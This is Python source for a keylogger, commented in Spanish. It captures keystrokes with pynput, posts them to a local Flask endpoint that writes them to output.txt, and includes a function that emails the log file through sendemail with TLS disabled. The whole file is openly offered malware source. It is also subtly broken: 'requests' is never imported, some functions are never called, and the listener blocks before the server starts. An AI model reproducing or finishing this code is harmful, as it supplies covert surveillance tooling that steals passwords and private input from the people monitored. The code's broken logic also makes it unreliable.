from flask import Flask, request
from pynput.keyboard import Key, Listener
import subprocess
from os import remove

app = Flask(__name__)

registros = []

def callback(event):
    registros.append(event.name)

# Función para enviar los registros por correo electrónico
def send_email(sender_email, receiver_email):
    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m 'Se adjunta el archivo de registros' -a output.txt -o tls=no"
    subprocess.run(command, shell=True)

# Función para guardar los registros en un archivo de texto
def output(text):
    with open('output.txt', 'a') as f:
        f.write(text)

# Función para manejar la pulsación de teclas
def presionar_tecla(key):
    try:
        registros.append(key)
    except Exception as e:
        print(f"Error: {str(e)}")

# Función para manejar la liberación de teclas
def soltar_tecla(key):
    if key == Key.esc:
        enviar_datos()
        return False

# Función para enviar los registros al servidor Flask
def enviar_datos():
    try:
        data = ','.join(map(str, registros))
        response = requests.post("http://localhost:8080/log", data=data)
        if response.status_code == 200:
            print("Datos enviados correctamente")
        else:
            print(f"Error al enviar datos al servidor: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"No se pudo conectar con el servidor: {e}")

# Ruta para recibir los datos del keylogger
@app.route('/log', methods=['POST'])
def receive_data():
    if request.method == 'POST':
        data = request.get_data().decode('utf-8')
        with open('output.txt', 'a') as f:
            f.write(data)
        return 'Datos recibidos y guardados'
    else:
        return 'Error'

# Ejecución del keylogger
with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()

# Ejecución de la aplicación Flask
if __name__ == '__main__':
    app.run(debug=True, port=8080)
